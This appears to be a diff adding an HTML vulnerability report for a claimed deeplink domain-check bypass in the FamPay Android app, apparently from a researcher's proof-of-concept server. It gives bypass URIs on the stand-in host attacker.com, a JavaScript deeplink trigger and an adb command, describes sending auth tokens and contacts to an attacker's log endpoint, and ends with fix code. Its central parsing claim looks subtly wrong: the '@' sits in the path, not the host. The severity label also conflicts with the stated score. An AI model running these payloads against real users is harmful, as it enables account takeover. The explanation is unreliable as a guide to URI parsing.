@@ -1,0 +1,187 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Chain C Report — HierarchicalUri Bypass | FamPay Security</title>
+<style>
+  *{box-sizing:border-box;margin:0;padding:0}
+  body{background:#0a0a0f;color:#e0e0e0;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;padding:24px 16px;max-width:760px;margin:0 auto;font-size:13px;line-height:1.7}
+  h1{font-size:22px;font-weight:900;color:#fff;margin-bottom:4px}
+  h2{font-size:14px;font-weight:700;color:#aa00ff;margin:28px 0 10px;letter-spacing:0.3px;text-transform:uppercase}
+  h3{font-size:12px;font-weight:700;color:#aaa;margin:16px 0 6px;text-transform:uppercase;letter-spacing:0.3px}
+  p{color:#bbb;margin-bottom:10px}
+  .badge{display:inline-block;font-size:10px;background:#12001a;border:1px solid #aa00ff;color:#aa00ff;padding:3px 12px;border-radius:20px;letter-spacing:1px;margin-bottom:12px}
+  .severity-bar{display:flex;align-items:center;gap:12px;background:#13131a;border:1px solid #2a2a3a;border-radius:8px;padding:16px 20px;margin-bottom:20px;flex-wrap:wrap}
+  .sev-label{font-size:11px;color:#666;text-transform:uppercase;letter-spacing:0.5px}
+  .sev-high{font-size:28px;font-weight:900;color:#aa00ff}
+  .sev-score{font-size:13px;color:#888}
+  .divider{width:1px;height:40px;background:#2a2a3a}
+  .meta-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:20px}
+  .meta-card{background:#13131a;border:1px solid #2a2a3a;border-radius:8px;padding:14px}
+  .meta-card .mk{font-size:10px;color:#555;text-transform:uppercase;letter-spacing:0.5px;margin-bottom:4px}
+  .meta-card .mv{font-size:12px;color:#e0e0e0;font-family:monospace;word-break:break-all}
+  code{background:#1a1a2a;border:1px solid #2a2a3a;padding:2px 6px;border-radius:3px;font-family:monospace;font-size:11px;color:#00e676}
+  pre{background:#0d0d14;border:1px solid #2a2a3a;border-radius:6px;padding:14px;overflow-x:auto;font-size:11px;color:#00e676;line-height:1.6;margin:10px 0}
+  .attack-chain{background:#13131a;border:1px solid #2a2a3a;border-radius:8px;padding:16px;margin:10px 0}
+  .chain-step{display:flex;gap:12px;align-items:flex-start;padding:8px 0;border-bottom:1px solid #1a1a2a}
+  .chain-step:last-child{border:none}
+  .step-num{background:#aa00ff;color:#fff;font-size:10px;font-weight:900;padding:2px 7px;border-radius:10px;min-width:24px;text-align:center;margin-top:1px}
+  .step-body .step-title{font-size:12px;color:#fff;font-weight:700;margin-bottom:2px}
+  .step-body .step-desc{font-size:11px;color:#888}
+  .fix-card{background:#0d1a0d;border:1px solid #1a3a1a;border-radius:8px;padding:14px;margin:8px 0}
+  .fix-card h4{font-size:11px;color:#00e676;margin-bottom:8px;text-transform:uppercase;letter-spacing:0.3px}
+  .tag{display:inline-block;font-size:9px;background:#1a1a2a;border:1px solid #2a2a3a;color:#448aff;padding:1px 6px;border-radius:3px;margin-right:4px}
+  .back-links{display:flex;gap:16px;font-size:11px;margin-top:28px;flex-wrap:wrap}
+  .back-links a{color:#448aff;text-decoration:none}
+  .highlight{background:#1a0a2a;border-left:3px solid #aa00ff;padding:10px 14px;border-radius:0 6px 6px 0;margin:10px 0;font-size:12px;color:#cc88ff}
+</style>
+</head>
+<body>
+
+<span class="badge">INTERNAL SECURITY REPORT — CHAIN C</span>
+<h1>HierarchicalUri Domain Validation Bypass</h1>
+<p style="color:#666;font-size:11px;margin-bottom:20px">FamPay Android v4.0.5.7 · Oversecured Finding #12 + #2 + #16 · March 2026</p>
+
+<div class="severity-bar">
+  <div><div class="sev-label">Severity</div><div class="sev-high">HIGH</div></div>
+  <div class="divider"></div>
+  <div><div class="sev-label">CVSS Score</div><div class="sev-score" style="font-size:22px;font-weight:700;color:#aa00ff">9.3</div></div>
+  <div class="divider"></div>
+  <div><div class="sev-label">Vector</div><div class="sev-score">AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N</div></div>
+</div>
+
+<div class="meta-grid">
+  <div class="meta-card"><div class="mk">Vulnerability</div><div class="mv">HierarchicalUri.getHost() discrepancy</div></div>
+  <div class="meta-card"><div class="mk">Bypass Payload</div><div class="mv">https://attacker.com/page@fam.one</div></div>
+  <div class="meta-card"><div class="mk">What check is bypassed</div><div class="mv">data.getHost().equals("fam.one")</div></div>
+  <div class="meta-card"><div class="mk">Chain Impact</div><div class="mv">Full JS Interface access from any origin</div></div>
+</div>
+
+<h2>Executive Summary (Non-Technical)</h2>
+<p>FamPay checks incoming links to ensure they come from its trusted domain <strong>fam.one</strong>. However, there is a flaw in how Android parses certain special URL formats. An attacker can create a link that looks like it comes from <strong>fam.one</strong> to FamPay's security check, but actually opens the attacker's website inside the app.</p>
+
+<div class="highlight">Think of it like a return address on a letter: the attacker writes "From: fam.one" on the envelope. FamPay checks the return address, sees "fam.one", and opens the letter — but the contents and the real sender are from the attacker.</div>
+
+<p>Once the attacker's page loads inside FamPay, all four JavaScript interfaces are available — granting access to auth tokens, user data, contacts, GPS location, and the ability to fire any internal deeplink.</p>
+
+<h2>The Bypass Explained</h2>
+<h3>How Android Parses the URI</h3>
+<p>Android's <code>Uri.parse()</code> can interpret the "userinfo" part of a URL (before the <code>@</code> sign) as credentials. In the URI:</p>
+<pre>https://attacker.com/exploit@fam.one/path</pre>
+<p><code>uri.getHost()</code> returns <strong>fam.one</strong> (what Android considers the host after <code>@</code>)</p>
+<p>But a browser/WebView actually navigates to <strong>attacker.com/exploit</strong> (the authority before <code>@</code>)</p>
+
+<h3>Vulnerable Code</h3>
+<pre>// DeepLinkActivity.java line ~2055
+String host = data.getHost();
+if (host != null && host.equals("fam.one")) {
+    // ✅ check passes — but we're actually loading attacker.com!
+    startWebViewActivity(data.toString(), ...);
+}</pre>
+
+<h2>Attack Chain</h2>
+<div class="attack-chain">
+  <div class="chain-step">
+    <div class="step-num">1</div>
+    <div class="step-body">
+      <div class="step-title">Craft malformed URI</div>
+      <div class="step-desc"><code>https://attacker.com/exploit@fam.one?fp_type=fpSurvey&fp_auth_req=true</code></div>
+    </div>
+  </div>
+  <div class="chain-step">
+    <div class="step-num">2</div>
+    <div class="step-body">
+      <div class="step-title">Deliver via deeplink</div>
+      <div class="step-desc">Base64 encode and send via <code>fp://fampay.in/home_init/?init_deeplink=&lt;b64&gt;</code></div>
+    </div>
+  </div>
+  <div class="chain-step">
+    <div class="step-num">3</div>
+    <div class="step-body">
+      <div class="step-title">FamPay checks getHost() → returns "fam.one"</div>
+      <div class="step-desc">Domain validation passes. App proceeds to load URL in WebView with all JS interfaces attached.</div>
+    </div>
+  </div>
+  <div class="chain-step">
+    <div class="step-num">4</div>
+    <div class="step-body">
+      <div class="step-title">WebView loads attacker.com</div>
+      <div class="step-desc">Browser resolves the URL to the attacker's server. Attacker page now has full NativeAuthAndroid, NativeActionsAndroid access.</div>
+    </div>
+  </div>
+  <div class="chain-step">
+    <div class="step-num">5</div>
+    <div class="step-body">
+      <div class="step-title">Auth token, user data, contacts exfiltrated</div>
+      <div class="step-desc">All data beaconed to attacker's /log endpoint. Account takeover is possible with the auth token.</div>
+    </div>
+  </div>
+</div>
+
+<h2>Proof of Concept Commands</h2>
+<h3>Bypass URI</h3>
+<pre>https://attacker.com/chain-c-exploit@fam.one?fp_type=fpSurvey&amp;fp_auth_req=true&amp;fp_new_window=true</pre>
+
+<h3>Base64 Encoded Deeplink</h3>
+<pre>// In attacker's page:
+const bypass = 'https://attacker.com/chain-c-exploit@fam.one?fp_type=fpSurvey&fp_auth_req=true';
+const deeplink = 'fp://fampay.in/home_init/?init_deeplink=' + btoa(bypass);
+window.location.href = deeplink;</pre>
+
+<h3>ADB Test</h3>
+<pre>BYPASS="https://attacker.com/chain-c-exploit@fam.one?fp_type=fpSurvey&fp_auth_req=true"
+B64=$(echo -n "$BYPASS" | base64)
+adb shell am start -a android.intent.action.VIEW \
+  -d "fp://fampay.in/home_init/?init_deeplink=$B64" \
+  com.fampay.in</pre>
+
+<h2>Remediation</h2>
+<div class="fix-card">
+  <h4>Fix 1 — Use getAuthority() + Strict Host Parsing (Recommended)</h4>
+  <pre>// Replace getHost() with a strict parser that rejects userinfo
+private boolean isTrustedHost(Uri uri) {
+    // Reject URLs containing @ (userinfo bypass)
+    String uriStr = uri.toString();
+    if (uriStr.contains("@")) return false;
+
+    String host = uri.getHost();
+    return "fam.one".equals(host) || host != null && host.endsWith(".fam.one");
+}</pre>
+</div>
+<div class="fix-card">
+  <h4>Fix 2 — Reject URLs with Userinfo</h4>
+  <pre>String rawUrl = data.toString();
+if (rawUrl.matches(".*://[^/]*@.*")) {
+    // Contains userinfo (@ sign in authority) — reject
+    Log.w(TAG, "Blocked URI with userinfo: " + rawUrl);
+    return;
+}</pre>
+</div>
+<div class="fix-card">
+  <h4>Fix 3 — URL Normalization before Validation</h4>
+  <pre>// Parse with java.net.URL which correctly identifies the host
+try {
+    URL parsed = new URL(data.toString());
+    String host = parsed.getHost(); // correctly returns attacker.com
+    if (!"fam.one".equals(host)) return; // blocked
+} catch (MalformedURLException e) {
+    return; // reject malformed URLs
+}</pre>
+</div>
+
+<h2>References</h2>
+<p><span class="tag">CWE-184</span> Incomplete List of Disallowed Inputs</p>
+<p><span class="tag">CWE-20</span> Improper Input Validation</p>
+<p><span class="tag">Oversecured</span> Finding #12 — HierarchicalUri Bypass</p>
+<p><span class="tag">Android</span> Uri.getHost() vs URL.getHost() discrepancy</p>
+
+<div class="back-links">
+  <a href="/chain-c-trigger">&#9889; Trigger PoC</a>
+  <a href="/chain-c-exploit">&#128305; Exploit Page</a>
+  <a href="/log-viewer">&#128225; Log Viewer</a>
+  <a href="/">&#8592; All Chains</a>
+</div>
+
+</body>
+</html>
